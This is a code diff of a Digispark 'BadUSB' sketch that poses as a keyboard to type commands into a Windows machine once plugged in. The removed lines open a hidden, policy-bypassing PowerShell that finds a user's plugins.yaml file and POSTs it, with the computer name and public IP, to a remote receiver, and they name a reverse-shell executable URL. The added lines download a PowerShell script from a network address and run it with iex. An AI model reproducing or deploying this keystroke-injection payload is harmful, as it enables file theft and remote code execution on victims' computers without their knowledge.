@@ -1,36 +1,24 @@
 #include "DigiKeyboard.h"
 
-// ============================================================
-//  CONFIGURATION — Change these before flashing
-// ============================================================
-#define RECEIVER_URL  "https://javagar-acer.tail9fdd55.ts.net"
-#define MESSAGE       "Hello from Digispark!"
-#define REVERSE_SHELL_URL "http://your-server.com/reverse.exe"
+// Store the script URL in PROGMEM (flash) to save RAM
+static const char scriptURL[] PROGMEM = "http://192.168.137.5:5000/download/payload.ps1";
 
 void setup() {
-  // Wait for the host OS to enumerate the USB HID device
   DigiKeyboard.delay(2000);
 
-  // --- Step 1: Open the Run dialog (Win + R) ---
+  // Open Run dialog (Win+R)
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
 
-  DigiKeyboard.print("cmd");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-
-  // --- Step 2: PowerShell finds plugins.yaml, reads it, and POSTs to receiver ---
-  DigiKeyboard.print(F("powershell -ep bypass -w hidden -c \""));
-  DigiKeyboard.print(F("$p=(iwr https://api.ipify.org -UseBasicParsing|Select -Exp Content);"));
-  DigiKeyboard.print(F("$f=(dir $env:USERPROFILE -r -filter 'plugins.yaml' -ea 0|Select -f 1);"));
-  DigiKeyboard.print(F("if($f){$c=gc $f.FullName -raw;}else{$c='Not found';}"));
-  DigiKeyboard.print(F("$u='"));
-  DigiKeyboard.print(RECEIVER_URL);
-  DigiKeyboard.print(F("/'+$env:COMPUTERNAME;"));
-  DigiKeyboard.print(F("iwr -UseBasicParsing -Method POST -Uri $u -Body $c -Headers @{"));
-  DigiKeyboard.print(F("'X-Message'='"));
-  DigiKeyboard.print(MESSAGE);
-  DigiKeyboard.print(F("';'X-Public-IP'=$p} \""));
+  // Print the PowerShell command without storing large strings in RAM
+  DigiKeyboard.print(F("powershell -WindowStyle Hidden -Command \"& { iwr "));
+  
+  // Print the URL from PROGMEM (character by character)
+  for (int i = 0; i < strlen_P(scriptURL); i++) {
+    DigiKeyboard.print((char)pgm_read_byte(&scriptURL[i]));
+  }
+  
+  DigiKeyboard.print(F(" -UseBasicParsing | iex }\""));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
 
@@ -52,7 +40,4 @@ void setup() {
   DigiKeyboard.delay(500);
 }
 
-void loop() {
-  // Nothing to repeat — the payload runs once on plug-in
-  DigiKeyboard.delay(5000);
-}
+void loop() {}
